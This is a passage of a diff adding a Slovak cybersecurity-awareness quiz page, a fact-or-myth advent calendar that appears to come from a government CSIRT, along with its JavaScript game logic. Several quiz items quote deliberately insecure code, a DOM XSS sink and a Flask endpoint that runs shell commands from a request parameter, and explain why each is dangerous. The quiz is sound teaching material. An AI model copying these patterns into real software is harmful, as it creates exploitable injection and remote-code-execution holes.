+          e: "Odchádzajúca komunikácia (angl. outbound) je často kľúčová (C2, exfiltráciu). Aj pri nepovolenom spojení typu inngress môže byť stroj kompromitovaný a komunikovať von. Monitoring egress spojení je zásadný.",
+          tip: "Zaveďte egress monitoring a blokovanie na úrovni DNS alebo proxy podľa politiky organizácie."
+        },
+        // 19
+        {
+          q: "Príkaz `sha256sum suspicious.bin` pomáha počas reakcie na incidenty pri zdieľaní indikátorov kompromitácie.",
+          correct: true,
+          e: "Hash (napr. SHA-256) sa používa na identifikáciu artefaktov a porovnávanie so známymi databázami alebo pozorovaniami. Nezabudnite pridať kontext (lokáciu a správanie súboru alebo čas nájdenia), samotný haš nestačí."
+        },
+        // 20
+        {
+          q: "Kód v JS: `element.innerHTML = location.hash;` môže predstavovať riziko vzniku XSS.",
+          correct: true,
+          e: "Ak sa do Document Object Model (DOM) vkladá neoverený vstup, útočník vie vložiť obsah HTML alebo JavaScript. Bez sanitizácie alebo kódovanie ide o DOM Cross-Site Scripting (XSS)."
+        },
+        // 21
+        {
+          q: "V autentifikačných logoch vidím úspešné prihlásenie z novej krajiny a hneď potom `sudo` a `wget`. Je rozumné vykonať triáž ako potenciálny prienik.",
+          correct: true,
+          e: "Sekvencia (nová geolokácia -> eskalácia privilégií -> sťahovanie obsahu) je typická stopa v rámci tzv. <a href='https://www.microsoft.com/en-us/security/business/security-101/what-is-cyber-kill-chain' target='_blank'>cyber kill chain</a>. Overte účet, MFA, zdroj IP, a následné zmeny."
+        },
+        // 22
+        {
+          q: "Zraniteľnosť typu SQL injekcia (SQLi) sa dá spoľahlivo vylúčiť, ak aplikácia používa tzv. 'escape' funkcie na vstup.",
+          correct: false,
+          e: "Escape je chybový a kontextovo závislý. Najspoľahlivejšie sú parameterizované dopyty (angl. prepared statements) a striktne definované typy."
+        },
+        // 23
+        {
+          q: "V logoch proxy je veľa požiadaviek s User-Agent `python-requests/2.x`. Môže ísť  o automatizovaný scraping alebo skenovanie.",
+          correct: true,
+          e: "Takýto User-Agent často používajú skripty. Nie je to automaticky škodlivé, ale je to dobrý signál na obmedzenie počtu dopytov, pravidlá pre Web Application Firewall alebo koreláciu s chybami alebo koncovými bodmi. Útočník, samozrejme, bude túto hodnotu meniť, aby pôsobil ako legitímny návštevník."
+        },
+        // 24
+        {
+          q: "Ak nájdem na Linuxe neznámy binárny súbor v `/tmp/.x` a má nastavený SUID bit, môže predstavovať vysoké riziko.",
+          correct: true,
+          e: "Set User ID (SUID) na neznámom binárnom súbore, navyše v dočasnom adresári /tmp/, je veľmi podozrivé (lokálna eskalácia, perzistencia). Okamžite izolujte a analyzujte.",
+          tip: "Izolujte zariadenie, spravte haš binárneho súboru a skontrolujte vlastníka a čas vytvorenia (`stat`)."
+        },
+        // 25
+        {
+          q: "Príkaz `grep -R 'BEGIN RSA PRIVATE KEY' -n /var/www` môže pomôcť odhaliť omylom uložené privátne kľúče v repozitári alebo koreňovom adresári (angl. web root).",
+          correct: true,
+          e: "Hľadanie citlivých reťazcov v kóde je praktická kontrola pri zabezpečení a patrí medzi proaktívne služby. Existencia takého záznamu predstavuje aj veľké riziko exfiltrácie."
+        },
+        // 26
+        {
+          q: "Kód v Python Flask: `subprocess.check_output(request.args.get('cmd'), shell=True)` je bezpečný, ak koncový bod (angl. endpoint) nie je verejný.",
+          correct: false,
+          e: "Ide priamo o vzdialené vykonanie kódu útočníkom (angl. Remote Code Execution, RCE). Aj interné koncové body aplikácie môžu byť pre útočníka dostupné (SSRF, VPN kompromitácia, laterálne pohyby). Nikdy nespúšťajte príkazy shell s neovereným vstupom.",
+          tip: "Použite tzv. allowlist príkazov bez shellu alebo úplne odstráňte spúšťanie OS príkazov z webu, pokiaľ je to možné."
+        },
+        // 27
+        {
+          q: "V logu IDS vidím výstrahu `ET POLICY PE EXE or DLL Windows file download`. Je to jasný dôkaz malvéru.",
+          correct: false,
+          e: "Je to indícia stiahnutia súboru Portable Executable (PE), ale môže ísť aj o legitímne stiahnutie. Na rozlíšenie je potrebný šírší kontext: URL, hash, reputácia, správanie zariadenia."
+        },
+        // 28
+        {
+          q: "Ak je v kóde `JWT` podpisovaný slabým tajomstvom (angl. secret), napr. krátky reťazec znakov, útočník môže tokeny falšovať útokom hrubou silou.",
+          correct: true,
+          e: "Slabé tajomstvo (angl. secret) pre HMAC podpis je riziko. Používajte dostatočne dlhé náhodné tajomstvá, rotáciu a preferujte vhodné a moderné algoritmy."
+        },
+        // 29
+        {
+          q: "Príkaz `git log -p -S 'password'` vie pomôcť nájsť v histórii verziovania zdrojového kódu tajomstvá (angl. secret).",
+          correct: true,
+          e: "Príkaz vyhľadá zmeny, kde sa objavuje reťazec. Počas vývoja aplikácie, pred nasadením alebo aj počas údržby je vhodné využívať ho ako formu prevencie, keďže je to veľmi užitočné (spolu so skenovaním tajomstiev v repozitároch)."
+        },
+        // 30
+        {
+          q: "Ak po incidente odstránim malvér (napr. presunutím do karantény) a nechám rovnaké prihlasovacie údaje a tokeny, je to akceptovateľné, ak systém funguje. Malvér pre istotu odstránim, aby sa z karantény nedostal von.",
+          correct: false,
+          e: "Útočník mohol získať heslá/tokeny a zanechať perzistenciu. Bez resetu a revízie prístupov hrozí opätovné zneužitie. Úloha povedať, či sa aktér hrozieb nachádza v sieti nie je triviálna.",
+          tip: "Resetujte kompromitované účty, invalidujte relácie/tokeny a overte MFA nastavenia a neničte dôkazy výmazom podozrivých mailov, súboro, inštaláciou nového zariadenia a pod."
+        }
+      ]
+    }
+    };
+
+    const ACTIVE_LEVEL_KEY = "csirt_game_active_level_v1";
+
+    function getStoredLevel() {
+      try {
+        const level = Number(localStorage.getItem(ACTIVE_LEVEL_KEY) || "1");
+        return LEVELS[level] ? level : 1;
+      } catch (e) {
+        return 1;
+      }
+    }
+
+    function saveStoredLevel(level) {
+      try {
+        localStorage.setItem(ACTIVE_LEVEL_KEY, String(level));
+      } catch (e) {}
+    }
+
+    function getLevelStorageKey(level) {
+      return `csirt_game_level_${level}_progress_v1`;
+    }
+
+    function getDoneModalKey(level) {
+      return `csirt_game_level_${level}_done_modal_shown_v1`;
+    }
+
+    function loadLevelProgress(level) {
+      try {
+        const raw = localStorage.getItem(getLevelStorageKey(level));
+        return raw ? JSON.parse(raw) : {};
+      } catch (e) {
+        return {};
+      }
+    }
+
+    function saveLevelProgress(level, progress) {
+      localStorage.setItem(getLevelStorageKey(level), JSON.stringify(progress));
+    }
+
+    function getLevelStats(level) {
+      const progress = loadLevelProgress(level);
+      const vals = Object.values(progress).filter(v => v && v.answered);
+      const correct = vals.filter(v => v.correct === true).length;
+      const wrong = vals.filter(v => v.correct === false).length;
+      const totalQuestions = LEVELS[level].questions.filter(q => q.correct !== null).length;
+      const infoCount = LEVELS[level].questions.filter(q => q.correct === null).length;
+      return {
+        answered: vals.length,
+        correct,
+        wrong,
+        totalQuestions,
+        infoCount,
+        perfect: totalQuestions > 0 && correct === totalQuestions && wrong === 0
+      };
+    }
+
+    function isLevel4Unlocked() {
+      return getLevelStats(3).perfect;
+    }
+
+    let currentLevelId = getStoredLevel();
+    if(currentLevelId === 4 && !isLevel4Unlocked()) {
+      currentLevelId = 3;
+      saveStoredLevel(3);
+    }
+
+    let CURRENT_LEVEL = LEVELS[currentLevelId];
+    let QUESTIONS = CURRENT_LEVEL.questions;
+    let questionsLen = QUESTIONS.length;
+    let LS_KEY = getLevelStorageKey(currentLevelId);
+    let LS_DONE_KEY = getDoneModalKey(currentLevelId);
+
+    const qs = (s, el=document) => el.querySelector(s);
+    const qsa = (s, el=document) => Array.from(el.querySelectorAll(s));
+
+    const state = {
+      progress: loadProgress(),
+      activeDay: null,
+      unlockedMaxDay: computeUnlockedMaxDay()
+    };
+
+    function syncLevelState() {
+      CURRENT_LEVEL = LEVELS[currentLevelId];
+      QUESTIONS = CURRENT_LEVEL.questions;
+      questionsLen = QUESTIONS.length;
+      LS_KEY = getLevelStorageKey(currentLevelId);
+      LS_DONE_KEY = getDoneModalKey(currentLevelId);
+      state.progress = loadProgress();
+      state.activeDay = null;
+      state.unlockedMaxDay = computeUnlockedMaxDay();
+    }
+
+    function loadProgress() {
+      try {
+        const raw = localStorage.getItem(LS_KEY);
+        return raw ? JSON.parse(raw) : {};
+      } catch (e) {
+        return {};
+      }
+    }
+
+    function saveProgress() {
+      localStorage.setItem(LS_KEY, JSON.stringify(state.progress));
+      updateProgressUI();
+      renderGrid();
+      renderLevelNav();
+      renderUnlockBox();
+    }
+
+    function computeUnlockedMaxDay() {
+      const now = new Date();
+      const m = now.getMonth();
+      const d = now.getDate();
+      if (m === 11) return Math.max(1, Math.min(questionsLen, d));
+      return questionsLen;
+    }
+    function isUnlocked(day) { return day <= state.unlockedMaxDay; }
+
+    function iconCheck() {
+      return `<svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+        <path d="M20 6 9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>`;
+    }
+
+    function escapeHtml(str) {
+      return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#39;");
+    }
+
+    function safeUrl(url) {
+      const value = String(url || "").trim();
+      return /^https?:\/\//i.test(value) ? value : "";
+    }
+
+    const ALLOWED_TAGS = new Set(["A", "BR", "P", "DIV", "SPAN", "STRONG", "B", "EM", "I", "UL", "OL", "LI", "CODE", "PRE"]);
+    const BLOCK_TAGS = new Set(["P", "DIV", "UL", "OL", "LI", "PRE"]);
+
+    function sanitizeNode(node) {
+      if (!node) return document.createDocumentFragment();
+
+      if (node.nodeType === Node.TEXT_NODE) {
+        return document.createTextNode(node.textContent || "");
+      }
+
+      if (node.nodeType !== Node.ELEMENT_NODE) {
+        return document.createDocumentFragment();
+      }
+
+      const tag = node.tagName.toUpperCase();
+
+      if (["SCRIPT", "STYLE", "IFRAME", "OBJECT", "EMBED"].includes(tag)) {
+        return document.createDocumentFragment();
+      }
+
+      if (!ALLOWED_TAGS.has(tag)) {
+        const fragment = document.createDocumentFragment();
+        for (const child of Array.from(node.childNodes)) {
+          fragment.appendChild(sanitizeNode(child));
+        }
+        return fragment;
+      }
+
+      const clean = document.createElement(tag.toLowerCase());
+
+      if (tag === "A") {
+        const href = safeUrl(node.getAttribute("href") || "");
+        if (!href) {
+          const fragment = document.createDocumentFragment();
+          for (const child of Array.from(node.childNodes)) {
+            fragment.appendChild(sanitizeNode(child));
+          }
+          return fragment;
+        }
+        clean.setAttribute("href", href);
+        clean.setAttribute("target", "_blank");
+        clean.setAttribute("rel", "noopener noreferrer");
+      }
+
+      for (const child of Array.from(node.childNodes)) {
+        clean.appendChild(sanitizeNode(child));
+      }
+
+      return clean;
+    }
+
+    function sanitizeHtmlFragment(input) {
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(`<div>${String(input || "")}</div>`, "text/html");
+      const root = doc.body.firstElementChild;
+      const fragment = document.createDocumentFragment();
+
+      if (!root) return fragment;
+
+      for (const child of Array.from(root.childNodes)) {
+        fragment.appendChild(sanitizeNode(child));
+      }
+
+      return fragment;
+    }
+
+    function renderInlineRichText(text) {
+      let source = String(text || "");
+
+      source = source.replace(/\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g, (_, label, href) => {
+        const safeHref = safeUrl(href);
+        const safeLabel = escapeHtml(String(label || safeHref || ""));
+        return safeHref ? `<a href="${escapeHtml(safeHref)}">${safeLabel}</a>` : safeLabel;
+      });
+
+      source = source.replace(/`([^`]+)`/g, (_, code) => `<code>${escapeHtml(String(code || ""))}</code>`);
+
+      return sanitizeHtmlFragment(source);
+    }
+
+    function appendRichParagraph(container, paragraph) {
+      const fragment = renderInlineRichText(paragraph.trim());
+      const previewNodes = Array.from(fragment.childNodes);
+      const hasBlock = previewNodes.some(node => node.nodeType === Node.ELEMENT_NODE && BLOCK_TAGS.has(node.tagName));
+
+      if (!previewNodes.length) return;
+
+      if (hasBlock) {
+        container.appendChild(fragment);
+        return;
+      }
+
+      const p = document.createElement("p");
+      p.appendChild(fragment);
+      container.appendChild(p);
+    }
+
+    function setSafeHTML(container, content) {
+      const source = String(content || "").replace(/\r\n/g, "\n");
+      container.innerHTML = "";
+
+      if (!source.trim()) return;
+
+      const parts = source.split(/```/);
+
+      for (let i = 0; i < parts.length; i++) {
+        const part = parts[i];
+        if (!part) continue;
+
+        if (i % 2 === 1) {
+          const block = part.replace(/^\n+|\n+$/g, "");
+          if (!block) continue;
+          const pre = document.createElement("pre");
+          const code = document.createElement("code");
+          code.textContent = block;
+          pre.appendChild(code);
+          container.appendChild(pre);
+          continue;
+        }
+
+        const paragraphs = part.split(/\n\s*\n/).filter(Boolean);
+        for (const paragraph of paragraphs) {
+          appendRichParagraph(container, paragraph);
+        }
+      }
+    }
+
+    function renderShell() {
+      document.title = CURRENT_LEVEL.title;
+      qs("#brandTitle").textContent = CURRENT_LEVEL.brandTitle;
+      qs("#brandSubtitle").textContent = CURRENT_LEVEL.brandSubtitle;
+      qs("#heroTitle").textContent = CURRENT_LEVEL.heroTitle;
+      qs("#heroText").textContent = CURRENT_LEVEL.heroText;
+      setSafeHTML(qs("#heroLinks"), CURRENT_LEVEL.heroLinksHtml);
+    }
+
+    function renderLevelNav() {
+      const select = qs("#levelSelect");
+      if (!select) return;
+
+      const currentValue = String(currentLevelId);
+      const unlocked4 = isLevel4Unlocked();
+
+      select.innerHTML = "";
+
+      const entries = [
+        { id: 1, label: "1 – Začiatočník" },
+        { id: 2, label: "2 – Mierne pokročilý" },
+        { id: 3, label: "3 – Pokročilý" }
+      ];
+
+      for (const entry of entries) {
+        const option = document.createElement("option");
+        option.value = String(entry.id);
+        option.textContent = entry.label;
+        if (entry.id === currentLevelId) option.selected = true;
+        select.appendChild(option);
+      }
+
+      if (unlocked4) {
+        const hiddenOption = document.createElement("option");
+        hiddenOption.value = "4";
+        hiddenOption.textContent = "4 – Skrytá úroveň";
+        hiddenOption.selected = currentValue === "4";
+        select.appendChild(hiddenOption);
+      }
+
+      if (!unlocked4 && currentValue === "4") {
+        select.value = "3";
+      }
+    }
+
+    function renderUnlockBox() {
+      const box = qs("#unlockBox");
+      if (isLevel4Unlocked()) {
+        box.hidden = false;
+        box.innerHTML = `<strong>Skrytá 4. úroveň je odomknutá.</strong> Získal si všetky bodované odpovede správne v 3. úrovni.`;
+        return;
+      }
+
+      box.hidden = true;
+      box.innerHTML = "";
+    }
+
+    function truncate(s, n) {
+      if (!s) return "";
+      return s.length > n ? s.slice(0, n - 1).trimEnd() + "…" : s;
+    }
+
+    function renderGrid() {
+      const grid = qs("#grid");
+      grid.replaceChildren();
+
+      for (let day = 1; day <= questionsLen; day++) {
+        const unlocked = isUnlocked(day);
+        const p = state.progress[day];
+        const done = !!p?.answered;
+
+        const statusClass =
+          (p?.info === true) ? " ak-info" :
+          (p?.correct === true) ? " ak-correct" :
+          (p?.correct === false) ? " ak-wrong" : "";
+
+        const tile = document.createElement("button");
+        tile.type = "button";
+        tile.className =
+          "ak-tile" +
+          (done ? " ak-completed" : "") +
+          statusClass +
+          (!unlocked ? " ak-locked" : "");
+
+        tile.dataset.day = String(day);
+        tile.setAttribute("aria-label", `Okienko ${day}${done ? " – navštívené" : ""}${!unlocked ? " – zamknuté" : ""}`);
+
+        const dayDiv = document.createElement("div");
+        dayDiv.className = "ak-day";
+        dayDiv.textContent = day;
+        tile.appendChild(dayDiv);
+
+        tile.addEventListener("click", () => {
+          if (!unlocked) {
+            toast(`Okienko ${day} sa odomkne v decembri podľa dátumu.`, 2200);
+            return;
+          }
+          openDay(day);
+        });
+
+        grid.appendChild(tile);
+      }
+
+      updateProgressUI();
+    }
+
+
+    function updateProgressUI() {
+      const vals = Object.values(state.progress).filter(v => v && v.answered);
+      const done = vals.length;
+      const correct = vals.filter(v => v.correct === true).length;
+      const wrong = vals.filter(v => v.correct === false).length;
+
+      const progressTextEl = qs("#progressText");
+      const scoreTextEl = qs("#scoreText");
+      const progressBarEl = qs("#progressBar");
+
+      if (progressTextEl) {
+        progressTextEl.textContent = `${done}/${questionsLen} hotovo`;
+      }
+      if (scoreTextEl) {
+        scoreTextEl.textContent = `• ${correct} správne • ${wrong} nesprávne`;
+      }
+      if (progressBarEl) {
+        progressBarEl.style.width = `${questionsLen ? Math.round((done / questionsLen) * 100) : 0}%`;
+      }
+    }
+
+    const toastEl = qs("#toast");
+    let toastTimer = null;
+    function toast(msg, ms = 1800) {
+      toastEl.textContent = msg;
+      toastEl.classList.add("show");
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(() => toastEl.classList.remove("show"), ms);
+    }
+
+    const modal = qs("#modal");
+    const flip = qs("#flip");
+    const qTitle = qs("#qTitle");
+    const qTitleBack = qs("#qTitleBack");
+    const backCard = qs(".ak-card.back");
+    const noteLocal = qs("#noteLocal");
+    const qText = qs("#qText");
+    const explainText = qs("#explainText");
+    const extraTip = qs("#extraTip");
+    const resultPill = qs("#resultPill");
+    const correctPill = qs("#correctPill");
+    const modalTitle = qs("#modalTitle");
+    const modalSubtitle = qs("#modalSubtitle");
+    const btnFact = qs("#btnFact");
+    const btnMyth = qs("#btnMyth");
+    const btnClose = qs("#btnClose");
+    const btnAbout = qs("#btnAbout");
+    let lastFocus = null;
+    let pendingDoneAfterClose = false;
+
+    function openModal() {
+      lastFocus = document.activeElement;
+      modal.classList.add("open");
+      document.body.style.overflow = "hidden";
+      btnClose.focus({ preventScroll: true });
+    }
+
+    function closeModal() {
+      modal.classList.remove("open");
+      document.body.style.overflow = "";
+      state.activeDay = null;
+      if (lastFocus && lastFocus.focus) lastFocus.focus({ preventScroll: true });
+
+      if (pendingDoneAfterClose) {
+        pendingDoneAfterClose = false;
+        setTimeout(showDoneModalOnce, 0);
+      }
+    }
+
+    function showDoneModalOnce() {
+      try {
+        if (localStorage.getItem(LS_DONE_KEY) === "1") return;
+        localStorage.setItem(LS_DONE_KEY, "1");
+      } catch (e) {}
+
+      state.activeDay = null;
+      qTitleBack.textContent = "";
+      setSafeHTML(explainText, "");
+      extraTip.textContent = "";
+      resultPill.className = "ak-pill";
+      resultPill.textContent = "";
+      correctPill.textContent = "";
+      flip.classList.remove("flipped");
+      qText.style.display = "";
+      btnFact.style.display = "none";
+      btnMyth.style.display = "none";
+      correctPill.style.display = "none";
+      noteLocal.style.display = "none";
+      resultPill.style.display = "";
+      backCard.style.display = "";
+
+      const vals = Object.values(state.progress).filter(v => v && v.answered && v.info !== true);
+      const correct = vals.filter(v => v.correct === true).length;
+      const wrong = vals.filter(v => v.correct === false).length;
+      const totalScored = correct + wrong;
+      const pct = totalScored ? (correct / totalScored) : 0;
+
+      let headline = "Hotovo! 👏";
+      let feedback = "Ďakujeme za hranie.";
+
+      if (pct === 1) {
+        headline = "Perfektný výsledok! 🏆";
+        feedback = "Zvládol(a) si všetky bodované otázky správne.";
+        if (currentLevelId === 3 && isLevel4Unlocked()) {
+          feedback += " Odomkol(a) si skrytú 4. úroveň – teraz sa ti zobrazí vo výbere úrovne.";
+        }
+      } else if (pct >= 0.8) {
+        headline = "Výborný výsledok! 🎯";
+        feedback = "Máš veľmi dobrý prehľad.";
+      } else if (pct >= 0.5) {
+        headline = "Dobrá práca 👍";
+        feedback = "Základy máš, no stále je priestor na zlepšenie.";
+      } else {
+        headline = "Nevadí, skús to znova 🙂";
+        feedback = "Aj táto hra slúži na učenie.";
+      }
+
+      modalTitle.textContent = "Dokončené";
+      modalSubtitle.textContent = `Úroveň ${currentLevelId}`;
+      qTitle.textContent = headline;
+      qText.textContent = `${feedback} Správne: ${correct}, nesprávne: ${wrong}.`;
+      resultPill.className = "ak-pill";
+      resultPill.textContent = `${Math.round(pct * 100)} % úspešnosť`;
+      setSafeHTML(explainText, "Môžeš si úroveň resetovať a prejsť znova. Progres každej úrovne sa ukladá samostatne v tomto prehliadači.");
+      extraTip.textContent = (currentLevelId === 3 && isLevel4Unlocked())
+        ? "Odomkol(a) si skrytú 4. úroveň."
+        : "";
+      openModal();
+    }
+
+    function openDay(day) {
+      const item = QUESTIONS[day - 1];
+      state.activeDay = day;
+
+      modalTitle.textContent = `Okienko ${day}`;
+      modalSubtitle.textContent = "Fakt alebo Mýtus";
+      qTitle.textContent = `Tvrdenie ${day}`;
+      qTitleBack.textContent = `Tvrdenie ${day}`;
+
+      const questionText = item.q || "";
+      setSafeHTML(qText, questionText);
+
+      noteLocal.style.display = "";
+      btnFact.style.display = item.correct === null ? "none" : "";
+      btnMyth.style.display = item.correct === null ? "none" : "";
+      correctPill.style.display = "";
+      resultPill.style.display = "";
+      backCard.style.display = "";
+
+      const p = state.progress[day];
+      flip.classList.remove("flipped");
+
+      if (p?.answered) {
+        showResult(day, p?.choice || null, true, false);
+      } else if (item.correct === null) {
+        showResult(day, null, false, false);
+      } else {
+        resultPill.className = "ak-pill";
+        resultPill.textContent = "Vyber odpoveď";
+        correctPill.className = "ak-pill";
+        correctPill.textContent = "Správne: –";
+        setSafeHTML(explainText, "");
+        extraTip.textContent = "";
+      }
+
+      openModal();
+    }
+
+    function showResult(day, choice, alreadyAnswered = false, animateFlip = true) {
+      const item = QUESTIONS[day - 1];
+      const isInfo = item.correct === null;
+
+      noteLocal.style.display = "none";
+      btnFact.style.display = isInfo ? "none" : "";
+      btnMyth.style.display = isInfo ? "none" : "";
+      backCard.style.display = "";
+
+      qTitleBack.textContent = `Tvrdenie ${day}`;
+
+      if (isInfo) {
+        resultPill.className = "ak-pill";
+        resultPill.textContent = "Informácia";
+        correctPill.className = "ak-pill";
+        correctPill.textContent = "Bez bodovania";
+        setSafeHTML(explainText, item.e || "");
+        extraTip.textContent = item.tip ? ("Tip: " + item.tip) : "";
+
+        if (!alreadyAnswered) {
+          state.progress[day] = { answered: true, info: true, choice: null };
+          saveProgress();
+          const done = Object.values(state.progress).filter(v => v && v.answered).length;
+          if (done === questionsLen) pendingDoneAfterClose = true;
+        }
+      } else {
+        const correctIsFact = item.correct === true;
+        const isCorrect = (choice === "fact" && correctIsFact) || (choice === "myth" && !correctIsFact);
+
+        resultPill.className = "ak-pill " + (isCorrect ? "good" : "bad");
+        resultPill.textContent = isCorrect ? "Správne ✅" : "Nesprávne ❌";
+
+        correctPill.style.display = "";
+        correctPill.className = "ak-pill";
+        correctPill.textContent = "Správne: " + (correctIsFact ? "Fakt ✅" : "Mýtus 🧯");
+
+        setSafeHTML(explainText, item.e || "");
+        extraTip.textContent = item.tip ? ("Tip: " + item.tip) : "";
+
+        if (!alreadyAnswered) {
+          state.progress[day] = { answered: true, correct: isCorrect, choice };
+          saveProgress();
+
+          const done = Object.values(state.progress).filter(v => v && v.answered).length;
+          if (done === questionsLen) {
+            pendingDoneAfterClose = true;
+          }
+        }
+      }
+
+      if (animateFlip) {
+        requestAnimationFrame(() => flip.classList.add("flipped"));
+      } else {
+        flip.classList.add("flipped");
+      }
+    }
+
+    function switchLevel(level) {
+      if (!LEVELS[level]) return;
+      if (level === 4 && !isLevel4Unlocked()) {
+        toast("4. úroveň sa odomkne až po perfektnom výsledku v 3. úrovni.", 2600);
+        return;
+      }
+
+      closeModal();
+      currentLevelId = level;
+      saveStoredLevel(level);
+      syncLevelState();
+      renderShell();
+      renderLevelNav();
+      renderUnlockBox();
+      renderGrid();
+      window.scrollTo({ top: 0, behavior: "smooth" });
+    }
+
+    btnFact.addEventListener("click", () => state.activeDay && showResult(state.activeDay, "fact", false, true));
+    btnMyth.addEventListener("click", () => state.activeDay && showResult(state.activeDay, "myth", false, true));
+
+    qs("#levelSelect").addEventListener("change", (e) => {
+      const nextLevel = Number(e.target.value || currentLevelId);
+      switchLevel(nextLevel);
+    });
+
+    btnClose.addEventListener("click", closeModal);
+    modal.addEventListener("click", (e) => { if (e.target === modal) closeModal(); });
+    window.addEventListener("keydown", (e) => { if (e.key === "Escape" && modal.classList.contains("open")) closeModal(); });
+
+    btnAbout.addEventListener("click", () => {
+      state.activeDay = null;
+      backCard.style.display = "";
+      noteLocal.style.display = "none";
+      modalTitle.textContent = "Ako to funguje";
+      modalSubtitle.textContent = "Krátke vysvetlenie";
+      flip.classList.remove("flipped");
+      qTitle.textContent = "Ako hra funguje";
+      qText.style.display = "";
+      qText.textContent =
+        "Klikni na ľubovoľné políčko, prečítaj tvrdenie a rozhodni, či ide o Fakt alebo Mýtus. Po odpovedi sa zobrazí správna odpoveď a vysvetlenie.";
+      resultPill.className = "ak-pill";
+      resultPill.textContent = "Progres";
+      correctPill.className = "ak-pill";
+      correctPill.textContent = "Ukladanie";
+      explainText.textContent =
+        "Tvoj progres sa ukladá iba v tomto prehliadači. Hra je anonymná a slúži na zvýšenie povedomia o kyberbezpečnosti a službách Vládnej jednotky CSIRT.";
+      extraTip.textContent = "";
+      btnFact.style.display = "";
+      btnMyth.style.display = "";
+      correctPill.style.display = "";
+      openModal();
+    });
+
+    qs("#btnReset").addEventListener("click", () => {
+      if (confirm(`Naozaj chceš vymazať uložený progres pre úroveň ${currentLevelId} v tomto prehliadači?`)) {
+        localStorage.removeItem(LS_KEY);
+        localStorage.removeItem(LS_DONE_KEY);
+        state.progress = {};
+        toast("Progres aktuálnej úrovne bol vymazaný.", 1600);
+        renderGrid();
+        renderLevelNav();
+        renderUnlockBox();
+      }
+    });
+
+    modal.addEventListener("keydown", (e) => {
+      if (e.key !== "Tab" || !modal.classList.contains("open")) return;
+      const focusables = qsa('button,[href],[tabindex]:not([tabindex="-1"])', modal)
+        .filter(el => !el.disabled && el.offsetParent !== null);
+      if (!focusables.length) return;
+      const first = focusables[0], last = focusables[focusables.length - 1];
+      if (e.shiftKey && document.activeElement === first) {
+        e.preventDefault(); last.focus();
+      } else if (!e.shiftKey && document.activeElement === last) {
+        e.preventDefault(); first.focus();
+      }
+    });
+
+    renderShell();
+    renderLevelNav();
+    renderUnlockBox();
+    renderGrid();
+  </script>
+</body>
+</html>
